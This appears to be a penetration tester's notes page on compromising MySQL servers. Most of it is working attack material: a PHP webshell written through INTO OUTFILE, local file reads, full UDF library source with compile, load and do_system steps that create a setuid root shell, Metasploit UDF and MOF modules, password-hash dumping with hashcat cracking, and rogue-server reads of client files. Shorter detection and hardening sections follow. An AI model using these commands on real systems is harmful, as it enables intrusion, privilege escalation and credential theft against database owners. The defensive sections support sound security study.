+++
title = 'MySQL'
date = 2026-10-30
type = 'notes'
weight = 500
toc = true
tags = ['protocols', 'services', 'mysql']
+++

MySQL is an open-source SQL relational database management system. It runs on **TCP port 3306** by default, and databases are frequently stored in a single `.sql` file — which makes a MySQL compromise both a data-disclosure event and, through file write and UDF, a **direct path to OS-level code execution**.

> **2025–2026 context:** MySQL remains a **high-value lateral target** because it frequently runs as `root` or `SYSTEM`, holds `FILE` privilege on legacy installations, and exposes the `plugin_dir` write primitive that UDF exploitation depends on. The current CVE feed is dominated by **Group Replication unauthenticated privilege escalation** (CVE-2026-101781, CVSS 8.8), **UDF privilege escalation** (CVE-2025-30721), and **application-layer "read-only" bypasses** that turn a reporting tool into a file-write primitive (CVE-2025-67509).

---

## 1. Basic Commands

| Command | Description |
|---|---|
| `mysql -h <FQDN/IP> -u <user> -p` | Login to the MySQL server (`-p` prompts; use `-p'password'` without a space to pass it inline) |
| `SHOW VARIABLES LIKE "secure_file_priv";` / `SELECT @@secure_file_priv;` | File import/export policy: `NULL` = disabled, `""` = unrestricted, a path = only that directory. It is read-only at runtime; change it in `my.cnf` and restart. |
| `SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/ws.php';` | Write a webshell (needs **FILE** privilege, a writable webroot, and the file must not already exist) |
| `SELECT LOAD_FILE("/etc/passwd");` | Read a local file (same FILE/`secure_file_priv` constraints; the MySQL OS user must be able to read it) |
| `SELECT @@version;` | Fingerprint MySQL with query output |
| `SELECT @@plugin_dir;` / `SHOW VARIABLES LIKE '%plugin%';` | **UDF prerequisite** — the directory where plugin libraries are loaded from |
| `SELECT user, authentication_string FROM mysql.user;` | Dump account hashes for offline cracking (needs SELECT on `mysql.user`) |
| `SELECT SLEEP(5);` | Fingerprint MySQL with no output |

---

## 2. Database Interaction

| Command | Description |
|---|---|
| `mysql -u root -h docker.hackthebox.eu -P 3306 -p` | Login to the MySQL database |
| `SHOW DATABASES;` | List available databases |
| `USE users;` | Switch to database |
| `CREATE TABLE logins (id INT, ...);` | Add a new table |
| `SHOW TABLES;` | List available tables in the current database |
| `DESCRIBE logins;` | Show table properties and columns |
| `INSERT INTO table_name VALUES (value_1,..);` | Add values to a table |
| `INSERT INTO table_name(column2, ...) VALUES (column2_value, ..);` | Add values to specific columns |
| `UPDATE table_name SET column1=newvalue1, ... WHERE ...;` | Update table values |
| `SELECT * FROM table_name;` | Show all columns in a table |
| `SELECT column1, column2 FROM table_name;` | Show specific columns |
| `DROP TABLE logins;` | Delete a table |
| `ALTER TABLE logins ADD newColumn INT;` | Add a new column |
| `ALTER TABLE logins RENAME COLUMN oldColumn TO newColumn;` | Rename a column (old name first) |
| `ALTER TABLE logins MODIFY oldColumn DATE;` | Change a column datatype |
| `ALTER TABLE logins DROP oldColumn;` | Delete a column |
| `SELECT * FROM logins ORDER BY column_1;` | Sort by a column |
| `SELECT * FROM logins ORDER BY column_1 DESC;` | Sort descending |
| `SELECT * FROM logins ORDER BY column_1 DESC, id ASC;` | Sort by two columns |
| `SELECT * FROM logins LIMIT 2;` | Show the first two results |
| `SELECT * FROM logins LIMIT 1, 2;` | Show two results starting from index 2 |
| `SELECT * FROM table_name WHERE ...;` | List results that meet a condition |
| `SELECT * FROM logins WHERE username LIKE 'admin%';` | Match a string pattern |

---

## 3. File Read / Write Prerequisites

- **FILE privilege** — `SELECT user, file_priv FROM mysql.user;` or `SHOW GRANTS;`
- **`secure_file_priv`** — `NULL` disables both `LOAD_FILE()` and `INTO OUTFILE`; an empty string means no restriction; a directory limits both to that directory.
- **`INTO OUTFILE` will not overwrite** an existing file — pick a new filename.
- The **MySQL OS user** must be able to read the source / write the destination; the SQL privilege alone is not enough.
- On MySQL 8 there is no `information_schema.global_variables`; use `SELECT @@secure_file_priv` or `performance_schema.global_variables`.
- Writing into a webroot is the standard SQLi-to-RCE path; if the webroot is not writable, look for a writable plugin / `--secure-file-priv` directory or use the DB to read configs and pivot.

> **2025 CVE — the "read-only" bypass.** **CVE-2025-67509 (Neuron MySQLSelectTool)** allowed `SELECT ... INTO OUTFILE` through a tool that presented itself as read-only. The fix was **not** a query filter — it was ensuring the DB account **does not hold FILE privilege** and `secure_file_priv` is **not** pointed at a web-accessible directory. A read-only UI is not a read-only database.

---

## 4. UDF Privilege Escalation

User-Defined Functions let MySQL load a **native shared library** and expose its symbols as SQL functions. If an attacker can write to `plugin_dir`, they can load a library that executes OS commands — and the command runs **as the MySQL server process**.

### 4.1 Preconditions

| Requirement | Check |
|---|---|
| **`plugin_dir` is writable** by the MySQL OS user | `SELECT @@plugin_dir;` then `ls -ld <dir>` from the OS |
| **`CREATE FUNCTION` privilege** | `SHOW GRANTS;` |
| **`FILE` privilege** (to write the `.so` via `INTO DUMPFILE`) | `SELECT user, file_priv FROM mysql.user;` |
| **`secure_file_priv`** does not block the write | `SELECT @@secure_file_priv;` |

> **`plugin_dir` write access is more critical than disabling `FILE`.** An attacker who can drop a `.so` into the plugin directory and call `CREATE FUNCTION ... SONAME` escalates without needing `INTO OUTFILE` at all — the write path and the load path are separate.

### 4.2 Compiling the UDF

The canonical library is **`raptor_udf2.c`** (ExploitDB), which exposes `do_system()`:

```c
/* raptor_udf2.c — dynamic library for do_system() */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

enum Item_result {STRING_RESULT, REAL_RESULT, INT_RESULT};
typedef struct st_udf_args {
    unsigned int arg_count;
    enum Item_result *arg_type;
    char **args;
    unsigned long *lengths;
    char *maybe_null;
} UDF_ARGS;

typedef struct st_udf_init {
    char maybe_null;
    unsigned int decimals;
    unsigned long max_length;
    char *ptr;
    char const *const_item_ref;
    char const *const_item;
} UDF_INIT;

char *do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)
{
    if (args->arg_count != 1) return NULL;
    system(args->args[0]);
    return NULL;
}
```

Compile on the **same architecture and libc** as the target:

```bash
gcc -g -c raptor_udf2.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

> **The modern UDF is `lib_mysqludf_sys`**, which exposes both **`sys_exec()`** (returns the exit code) and **`sys_eval()`** (returns stdout). The `raptor_udf2` library is MySQL 5.0+ compliant but lacks `sys_eval`; the newer library is preferable when available.

### 4.3 Writing the library

**From inside MySQL** (requires `FILE` and a writable `plugin_dir`):

```sql
-- Create a table to hold the binary
CREATE TABLE foo(line BLOB);
INSERT INTO foo VALUES (LOAD_FILE('/tmp/raptor_udf2.so'));

-- Write it to the plugin directory
SELECT * FROM foo INTO DUMPFILE '/usr/lib/mysql/plugin/raptor_udf2.so';
```

**From the OS** (if you have shell access):

```bash
cp raptor_udf2.so /usr/lib/mysql/plugin/
```

### 4.4 Registering and executing

```sql
-- Register the function
CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';

-- Execute a command
SELECT do_system('id > /tmp/out; chmod 777 /tmp/out');
SELECT do_system('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash');

-- With lib_mysqludf_sys:
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('id');
SELECT sys_eval('id');
```

> **Cleanup:** `DROP FUNCTION do_system;` and delete the `.so` from `plugin_dir` — a leftover UDF is both a persistence mechanism and an obvious IOC.

### 4.5 Automated tooling

```bash
# Metasploit
use exploit/multi/mysql/mysql_udf_payload
set RHOSTS <target>
set USERNAME root
set PASSWORD <password>
run
```

> **Metasploit writes the DLL into `lib\plugin\`** — the directory must exist (on some Windows installations it does not, and must be created manually).

**The 2026 chained example — CVE-2026-32710 (MariaDB 11.4.x):** a heap buffer overflow in `JSON_SCHEMA_VALID()` (`json_get_normalized_string()` — `strncpy` into a 128-byte `DYNAMIC_STRING` with no bounds check) escalates a **`SELECT`-only user** to **`ALL PRIVILEGES`**, then **writes a pre-compiled UDF to `plugin_dir` via `LOAD_FILE` + `INTO DUMPFILE`**, registers **`sys_exec()`**, and executes commands as the `mysql` user. This is the modern UDF chain in one vulnerability.

### 4.6 Detection

| Signal | Where |
|---|---|
| **`CREATE FUNCTION ... SONAME`** | MySQL general query log, audit plugin |
| **A new `.so` in `plugin_dir`** | File-integrity monitoring — the plugin directory should be immutable in production |
| **`INTO DUMPFILE` writing a binary** | Query log — `SELECT ... INTO DUMPFILE` on a non-SQL file |
| **`sys_exec` / `do_system` in `mysql.func`** | `SELECT * FROM mysql.func;` — a UDF registered outside a change window |
| **A `SELECT`-only user holding `ALL PRIVILEGES`** | Privilege-change audit — CVE-2026-32710's escalation step |

> **Detection rule:** alert on **`CREATE FUNCTION`** from any account that is not a DBA, and on **any write to `plugin_dir`** — those two events together are the UDF signature.

---

## 5. Hash Extraction and Cracking

### 5.1 Identify the hash type

`mysql.user.authentication_string` holds the hash. The prefix determines the hashcat mode:

| Prefix | Plugin | Hashcat mode |
|---|---|---|
| **`*`** + 40 hex chars | `mysql_native_password` (double SHA-1) | **`300`** |
| **`$A$`** | `caching_sha2_password` (SHA-256) | **`7401`** |
| **16 hex chars, no prefix** | Pre-4.1 MySQL | **`200`** (legacy) |
| **empty / `*`** | No password set | **Login directly** — no cracking |

> **`$A$` is mode 7401, not 300.** `mysql_native_password` is the fast double-SHA-1 format; `caching_sha2_password` (the MySQL 8 default) is SHA-256 and is **substantially slower** to crack — but it is still crackable offline.

### 5.2 Dump the hashes

```bash
mysql -h $TARGET_IP -P 3306 -u $USER -p$PASSWORD -s -N \
  -e "SELECT user, host, plugin, authentication_string FROM mysql.user \
      WHERE authentication_string != '' AND authentication_string != '*';" \
  > /tmp/mysql-hashes-raw.txt
```

**Split by type:**

```bash
grep -P '\t\*[A-F0-9]{40}$' /tmp/mysql-hashes-raw.txt | awk '{print $4}' > /tmp/native.txt
grep -P '\t\$A\$' /tmp/mysql-hashes-raw.txt | awk '{print $4}' > /tmp/sha2.txt
```

### 5.3 Crack

```bash
# mysql_native_password — mode 300
hashcat -m 300 /tmp/native.txt /usr/share/wordlists/rockyou.txt

# caching_sha2_password — mode 7401
hashcat -m 7401 /tmp/sha2.txt /usr/share/wordlists/rockyou.txt
```

> **Do not strip the leading `*`** — hashcat expects it for mode 300 and strips it internally.

### 5.4 Prioritise

- **Accounts with `host = %`** are remotely accessible from any IP — crack and reuse them first.
- **Empty `authentication_string`** accounts need no cracking at all — log in directly.
- **Password reuse is common** across MySQL, SSH, and application accounts — a cracked hash frequently unlocks more than the database.

---

## 6. MOF Execution (Windows, Legacy)

On **Windows Server 2003 and earlier**, the WMI repository processes `.mof` files placed in `C:\Windows\System32\wbem\mof\` and **executes them as `SYSTEM`**. A MySQL account with `FILE` privilege can write a `.mof` file into that directory, and the WMI service compiles and runs it.

```sql
SELECT 0x23707261676d61206e616d6573706163652022... INTO DUMPFILE
  'C:\Windows\System32\wbem\mof\nullevt.mof';
```

**Metasploit:**

```text
use exploit/windows/mysql/mysql_mof
set RHOSTS <target>
set USERNAME root
set PASSWORD <password>
run
```

> **MOF is effectively dead on Windows Server 2008 and later** — Microsoft tightened the WMI `.mof` compilation permissions, and the technique is described as “very difficult to succeed” on modern versions. It remains relevant only on **legacy 2003-era hosts** and in lab environments.

---

## 7. Client-Side Attacks — The Rogue Server

These attacks target the **client**, not the server. A malicious MySQL server can read arbitrary files from any client that connects to it.

### 7.1 `LOAD DATA LOCAL INFILE` — arbitrary file read

The MySQL protocol lets the **server** tell the client which file to read. A rogue server can request `/etc/passwd`, `C:\Windows\win.ini`, SSH keys, or cloud credentials, and the client **sends the file contents over the wire**.

```bash
# Rogue server tooling
# https://github.com/rmdavy/loadata  (or the Metasploit module)
```

> **The client-side settings are not checked before sending local files** — this is **CVE-2025-62611** (and the older CVE-2019-2503). A rogue MySQL server that emulates authorisation, ignores client flags, and sends a `LOAD_LOCAL` instruction packet can obtain arbitrary files from the client. Mydumper has local-infile enabled by default and no option to disable it — connecting it to an untrusted server is an arbitrary file read.

**The JDBC connection-injection variant:** an attacker-controlled JDBC URL pointing at a rogue MySQL server triggers the same `LOAD DATA LOCAL INFILE` read from the **application server** — and if H2, SQLite, or a vulnerable driver is on the classpath, the same URL can escalate to **RCE** via `RUNSCRIPT` or deserialisation.

### 7.2 SSL/TLS downgrade

Historically, the MySQL client treated `--ssl` as **advisory**: if the server did not advertise `CLIENT_SSL`, the client fell back to plaintext **without notice** (BACKRONYM, CVE-2018-2767). A malicious server or MITM could omit `CLIENT_SSL` and capture the authentication exchange.

> **2026 status:** the fix is to **fail closed** when `ssl_mode=require` and the server does not advertise `CLIENT_SSL`. A 2026 security audit found Bun's Rust MySQL client **failing open** — it skipped TLS setup and continued over the plaintext socket despite `ssl_mode=require`. Verify the client version before assuming `--ssl` is enforcing.

---

## 8. Recent CVEs (2025–2026)

| CVE | Severity | Primitive | Affected |
|---|---|---|---|
| **CVE-2026-101781** | **8.8** | **Unauthenticated** privilege escalation in **Group Replication GCS** — an attacker on the **same physical network segment** bypasses authentication and takes over the database instance | MySQL 8.4.0–8.4.12, 9.7.0–9.7.3, 26.7.0–26.7.1; Cluster 8.0.0–8.0.49 |
| **CVE-2026-22001** | Critical | **Information Schema privilege escalation** (CWE-285) — high-privileged attacker gains unauthorised read access | ≤ 8.0.45, 8.4.8, 9.6.0 |
| **CVE-2025-30721** | **4.0** | **UDF component** privilege escalation — high-privileged local attacker | 8.0.0–8.0.41, 8.4.0–8.4.4, 9.0.0–9.2.0 |
| **CVE-2025-50087** | High | **Access control error** — unauthorised read, create, delete, or modify of all accessible data | 8.0.0–8.0.42, 8.4.0–8.4.5, 9.0.0–9.3.0 |
| **CVE-2025-21546** | High | **Incorrect authorization** | MySQL Server |
| **CVE-2025-50103** | — | **LDAP Auth** privilege escalation | 9.0.0–9.3.0 |
| **CVE-2025-67509** | — | **`SELECT ... INTO OUTFILE` "read-only" bypass** in Neuron MySQLSelectTool — file write → potential RCE | Neuron |
| **CVE-2026-32710** | — | **MariaDB `JSON_SCHEMA_VALID()` heap overflow** → `SELECT`-only → `ALL PRIVILEGES` → UDF RCE | MariaDB 11.4.9 |
| **CVE-2026-75092** | — | **leapp-upgrade MySQL actor** privilege escalation — sets `plugin_dir` and `early_plugin_load` | RHEL 9→10 upgrade |
| **CVE-2026-61828** | — | **NixOS `services.mysql`** initialises with **insecure authentication by default** — local unprivileged users log in as root without a password | nixpkgs < 25.11 / 26.05 |
| **CVE-2025-62611** | — | **Client-side `LOAD DATA LOCAL INFILE`** — rogue server reads arbitrary client files | MySQL client |

---

## 9. Detection and Hardening

| Control | How |
|---|---|
| **Restrict `plugin_dir` write access** | The MySQL OS user must **not** be able to write to `plugin_dir` — this is the single highest-value UDF mitigation |
| **Remove `FILE` privilege from application accounts** | `REVOKE FILE ON *.* FROM 'app'@'%';` — closes `INTO OUTFILE` and `LOAD_FILE` |
| **Set `secure_file_priv` to a non-web directory** | Or `NULL` to disable file import/export entirely |
| **Audit `mysql.func`** | `SELECT * FROM mysql.func;` — any function not installed by a known package is suspicious |
| **Do not run MySQL as root/SYSTEM** | A UDF executes as the MySQL OS user — running as a low-privilege account limits the impact |
| **Disable `LOAD DATA LOCAL INFILE` on clients** | `local_infile=0` — prevents the rogue-server file read |
| **Enforce TLS with `--ssl-mode=VERIFY_IDENTITY`** | Fail closed — do not fall back to plaintext |
| **Patch Group Replication** | CVE-2026-101781 is unauthenticated — isolate the replication segment and patch |
| **Monitor `CREATE FUNCTION`** | Alert on any `CREATE FUNCTION ... SONAME` outside a change window |

---

## 10. Testing Methodology

```text
1. Connect and fingerprint
   - mysql -h <target> -u <user> -p
   - SELECT @@version, @@plugin_dir, @@secure_file_priv;

2. Privilege check
   - SHOW GRANTS;
   - SELECT user, file_priv FROM mysql.user;
   - Is FILE privilege present? Is plugin_dir writable?

3. File read / write
   - SELECT LOAD_FILE('/etc/passwd');
   - SELECT '...' INTO OUTFILE '/var/www/html/ws.php';
   - If secure_file_priv blocks it, check the plugin_dir path instead

4. UDF escalation
   - Compile raptor_udf2.so or lib_mysqludf_sys.so
   - Write to plugin_dir via INTO DUMPFILE or OS copy
   - CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
   - SELECT sys_exec('id');

5. Hash extraction
   - Dump mysql.user.authentication_string
   - Split by prefix: * → mode 300, $A$ → mode 7401
   - hashcat -m 300 / -m 7401

6. MOF (Windows 2003 only)
   - INTO DUMPFILE into C:\Windows\System32\wbem\mof\nullevt.mof
   - Metasploit: exploit/windows/mysql/mysql_mof

7. Client-side (if you control the server)
   - Rogue server with LOAD_LOCAL → arbitrary client file read

8. Patch level
   - CVE-2026-101781 (Group Replication, unauthenticated)
   - CVE-2025-30721 (UDF)
   - CVE-2025-67509 (INTO OUTFILE bypass)
```

---

## 11. Field Notes

- **UDF is the highest-impact MySQL privilege escalation** — a writable `plugin_dir` plus `CREATE FUNCTION` is OS command execution as the MySQL user, and **the plugin directory is a more critical control than `FILE` privilege**.
- **`sys_exec()` returns the exit code; `sys_eval()` returns stdout.** Prefer `lib_mysqludf_sys` over `raptor_udf2` — it gives you both.
- **`caching_sha2_password` is mode 7401, not 300.** The `$A$` prefix is the tell; `mysql_native_password` is the `*` prefix and is far faster to crack.
- **Empty `authentication_string` means no password** — log in directly, do not waste GPU time.
- **MOF is dead on Server 2008+.** It is a 2003-era technique and “very difficult” on modern Windows.
- **`LOAD DATA LOCAL INFILE` is a client-side attack.** A rogue server can read arbitrary files from any client that connects — CVE-2025-62611, and it affects Mydumper by default.
- **"Read-only" is not a security control.** CVE-2025-67509 bypassed a read-only tool with `INTO OUTFILE` — the fix is removing `FILE` privilege, not filtering queries.
- **CVE-2026-101781 is unauthenticated and network-adjacent** — an attacker on the same physical segment takes over Group Replication. Patch and isolate.
- **CVE-2026-32710 is the modern UDF chain in one bug** — a `SELECT`-only user escalates to `ALL PRIVILEGES` and then to UDF command execution.
- **Audit `mysql.func`.** A registered UDF outside a change window is the clearest post-exploitation signal on a MySQL host.
